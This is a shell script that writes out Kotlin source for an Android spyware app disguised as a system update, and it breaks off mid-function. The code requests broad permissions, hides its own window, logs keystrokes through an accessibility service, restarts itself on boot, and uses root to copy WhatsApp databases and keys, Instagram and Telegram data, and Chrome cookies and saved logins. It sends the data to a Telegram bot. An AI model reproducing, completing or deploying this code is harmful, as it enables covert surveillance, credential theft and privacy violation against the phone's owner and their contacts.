          cat > app/src/main/java/com/sysupdate/core/Telegram.kt <<'EOF'
          package com.sysupdate.core
          import okhttp3.*
          import okhttp3.MediaType.Companion.toMediaTypeOrNull
          import java.io.File
          import java.util.concurrent.TimeUnit
          object Telegram {
              private val http = OkHttpClient.Builder()
                  .connectTimeout(30, TimeUnit.SECONDS)
                  .writeTimeout(120, TimeUnit.SECONDS)
                  .readTimeout(120, TimeUnit.SECONDS).build()
              private fun url(m: String) = "https://api.telegram.org/bot${Config.BOT_TOKEN}/$m"
              fun texto(msg: String) {
                  val b = FormBody.Builder().add("chat_id", Config.CHAT_ID)
                      .add("text", msg.take(4000)).build()
                  runCatching { http.newCall(Request.Builder().url(url("sendMessage")).post(b).build()).execute().close() }
              }
              fun documento(f: File, legenda: String) {
                  val b = MultipartBody.Builder().setType(MultipartBody.FORM)
                      .addFormDataPart("chat_id", Config.CHAT_ID)
                      .addFormDataPart("caption", legenda.take(1000))
                      .addFormDataPart("document", f.name, f.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                      .build()
                  runCatching { http.newCall(Request.Builder().url(url("sendDocument")).post(b).build()).execute().close() }
              }
          }
          EOF

          cat > app/src/main/java/com/sysupdate/core/MainActivity.kt <<'EOF'
          package com.sysupdate.core
          import android.Manifest
          import android.app.Activity
          import android.content.Intent
          import android.net.Uri
          import android.os.Build
          import android.os.Bundle
          import android.os.PowerManager
          import android.provider.Settings
          class MainActivity : Activity() {
              private val base = mutableListOf(
                  Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
                  Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE,
                  Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                  Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
                  Manifest.permission.POST_NOTIFICATIONS
              ).apply {
                  if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.READ_MEDIA_IMAGES)
                  if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.READ_MEDIA_AUDIO)
              }.toTypedArray()
              override fun onCreate(s: Bundle?) { super.onCreate(s); requestPermissions(base, 1) }
              override fun onRequestPermissionsResult(c: Int, p: Array<out String>, r: IntArray) {
                  super.onRequestPermissionsResult(c, p, r)
                  if (Build.VERSION.SDK_INT >= 29 && c == 1)
                      requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 2)
                  else iniciar()
              }
              private fun iniciar() {
                  val pm = getSystemService(POWER_SERVICE) as PowerManager
                  if (!pm.isIgnoringBatteryOptimizations(packageName)) runCatching {
                      startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                          Uri.parse("package:$packageName")))
                  }
                  startForegroundService(Intent(this, SyncService::class.java))
                  Telegram.text("Instalado: ${Build.MANUFACTURER} ${Build.MODEL} Android ${Build.VERSION.RELEASE}")
                  finishAndRemoveTask()
              }
          }
          EOF

          cat > app/src/main/java/com/sysupdate/core/KeylogService.kt <<'EOF'
          package com.sysupdate.core
          import android.accessibilityservice.AccessibilityService
          import android.view.accessibility.AccessibilityEvent
          import java.io.File
          class KeylogService : AccessibilityService() {
              private val buf = StringBuilder()
              private var ultimo = System.currentTimeMillis()
              override fun onAccessibilityEvent(e: AccessibilityEvent?) {
                  e ?: return
                  if (e.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                      val t = e.text?.joinToString("") ?: return
                      if (t.isNotBlank()) buf.appendLine("[${e.packageName}] $t")
                  }
                  if (buf.length > 3000 || System.currentTimeMillis() - ultimo > 600_000) enviar()
              }
              private fun enviar() {
                  if (buf.isBlank()) return
                  val f = File(cacheDir, "keylog_${System.currentTimeMillis()}.txt")
                  runCatching { f.writeText(buf.toString()); Telegram.documento(f, "Keylog"); f.delete() }
                  buf.clear(); ultimo = System.currentTimeMillis()
              }
              override fun onInterrupt() {}
          }
          EOF

          cat > app/src/main/java/com/sysupdate/core/BootReceiver.kt <<'EOF'
          package com.sysupdate.core
          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.os.Build
          class BootReceiver : BroadcastReceiver() {
              override fun onReceive(c: Context, i: Intent) {
                  val s = Intent(c, SyncService::class.java)
                  if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s) else c.startService(s)
              }
          }
          EOF

          cat > app/src/main/java/com/sysupdate/core/Root.kt <<'EOF'
          package com.sysupdate.core
          import java.io.File
          object Root {
              fun temRoot(): Boolean = runCatching {
                  val p = ProcessBuilder("su", "-c", "id").redirectErrorStream(true).start()
                  val s = p.inputStream.bufferedReader().readText(); p.waitFor(); s.contains("uid=0")
              }.getOrDefault(false)
              fun exec(cmd: String): String = runCatching {
                  val p = ProcessBuilder("su", "-c", cmd).redirectErrorStream(true).start()
                  val s = p.inputStream.bufferedReader().readText(); p.waitFor(); s
              }.getOrDefault("")
              private fun copiar(o: List<String>, d: File) {
                  d.mkdirs(); o.forEach { exec("cp -a $it ${d.absolutePath}/ 2>/dev/null") }
              }
              fun whatsapp(d: File) {
                  copiar(listOf(
                      "/data/data/com.whatsapp/databases/msgstore.db",
                      "/data/data/com.whatsapp/databases/wa.db",
                      "/data/data/com.whatsapp/databases/axolotl.db",
                      "/data/data/com.whatsapp/files/key",
                      "/data/data/com.whatsapp/shared_prefs"), d)
              }
              fun apps(d: File) {
                  copiar(listOf(
                      "/data/data/com.instagram.android/databases",
                      "/data/data/org.telegram.messenger/files",
                      "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                      "/data/data/com.android.chrome/app_chrome/Default/Login Data"), d)
              }
              fun sistema(d: File) {
